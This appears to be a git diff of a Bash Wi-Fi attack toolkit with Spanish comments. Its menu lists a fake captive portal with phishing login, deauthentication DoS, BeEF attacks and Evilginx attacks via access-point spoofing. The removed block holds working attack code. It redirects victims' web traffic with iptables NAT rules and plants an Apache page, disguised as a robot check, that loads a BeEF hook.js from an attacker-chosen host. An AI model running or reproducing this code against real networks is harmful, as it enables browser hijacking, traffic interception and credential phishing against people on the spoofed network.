@@ -127,7 +127,6 @@ open_terminal() {
     # Esperar que la terminal se inicie
     sleep 2
 
-
     # Obtener ID de la ventana asociada al proceso
     WINDOW_ID=$(wmctrl -l | grep "$TERMINAL_TITLE" | awk '{print $1}')
 
@@ -193,7 +192,7 @@ manager_mode(){
             exit 1
         fi
 
-        sudo service NetworkManager restart
+        sudo service NetworkManager restart 
         sudo service wpa_supplicant restart
 
         MON_INTERFACE=""
@@ -230,7 +229,7 @@ check_password(){
 }
 
 
-
+#Variables generales para el script con la información de la wifi selecionada.
 BSSID_VAR=""
 CHANNEL_VAR=""
 PRIVACY_VAR=""
@@ -519,117 +518,6 @@ Bruteforce(){
     
 }
 
-IP_HOOK=""
-
-iptables_redirect_traffic(){
-    
-    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
-    iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:80
-    iptables -t nat -A POSTROUTING -j MASQUERADE
-
-}
-
-cleantables() {
-    iptables -F
-    iptables -t nat -F
-    iptables -X
-    iptables -Z
-}
-
-html_hook(){
-
-    cat <<EOF > ./templates/index.html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <script src="http://$IP_HOOK:3000/hook.js"></script>
-</head>
-<body>
-    <h1>Verificando que no eres un robot...</h1>
-</body>
-</html>
-EOF
-
-    echo "HTML template created"
-
-    cp ./templates/index.html /var/www/html/index.html
-
-    rm ./templates/index.html
-
-    systemctl restart apache2
-
-}
-
-beef_hosted() {
-    read -p "Insert the beef server pubic adrress or Domain name" IP_HOOK
-
-    if wget $IP_HOOK:3000/hook.js ; then  
-        echo "Found hook on $IP_HOOK" 
-    else
-        echo "We haven't found the $IP_HOOK:3000/hook.js\n"
-        echo "Make sure its avaliable the port and the hook.js on that server"
-        return 1
-    fi
-
-    rm hook.js
-    
-    html_hook & 
-
-    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
-        firefox --browser   --new-window $IP_HOOK:3000/ui/panel
-    else
-        echo "You are not on graphic terminal we can't open beef panel"
-    fi
-
-}
-
-beef_local() {
-    
-    IP_HOOK="127.0.0.1"
-
-    sudo beef-xss
-    sleep 2
-    
-    if wget $IP_HOOK:3000/hook.js ; then  
-        echo "Found hook on $IP_HOOK" 
-    else
-        echo "We haven't found the $IP_HOOK:3000/hook.js\n"
-        echo "Make sure its avaliable the port and the hook.js on that server"
-        return 1
-    fi
-
-    rm hook.js
-    
-    html_hook & 
-
-    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
-        firefox --browser --new-window $IP_HOOK:3000/ui/panel
-    else
-        echo "You are not on graphic terminal we can't open beef panel"
-    fi
-
-}
-
-beef_menu() {
-    clear
-    exit_menu=false
-    while ! $exit_menu; do
-        echo "Beef Menu:"
-        echo "0. Exit"
-        echo "1. Use an external server"
-        echo "2. Launch beef localy"
-        read -p "Please Chose the type of Beef server: " CHOICE
-
-        case $CHOICE in
-            0) return 0;;
-            1) beef_hosted ;;
-            2) beef_local ;;
-            *) echo -e ""$BRED"[✗]"$NC" Not valid option."; exit_menu=true;;
-        esac
-    done
-
-    return 0
-}
 
 
 menu(){
@@ -720,7 +608,8 @@ menu(){
         echo -e "$CYAN""6."$NC" Fake Captive Portal (Deauther + Ap Spofing + Phishing Login)"
         echo -e "$CYAN""7."$NC" DoS Attack (Stop the wireless conexions)"
         echo -e "$CYAN""8."$NC" Scan Network (Search Devices + Vulnerabilities)"
-        echo -e "$CYAN""9."$NC" BEeF redirect attack"
+        echo -e "$CYAN""9."$NC" BEeF attack ith Ap Spofing"
+        echo -e "$CYAN""10."$NC" Evilginx Attack with Ap Spofing"
         echo -e "$BLUE""- - - - - - - - - - - - - - - - - -"
         echo -e "$NC"""
         echo ""
@@ -736,6 +625,7 @@ menu(){
             7) Deauther "0" ;;
             8) ./netscan.py ;;
             9) beef_menu ;;
+            10) echo "";;
             0) echo -e "👋 "$BLUE"Goodbye...""$NC"; exit 0 ;;
             *) echo -e ""$BRED"[✗]"$NC" Not valid option." ; sleep 2 ;;
         esac
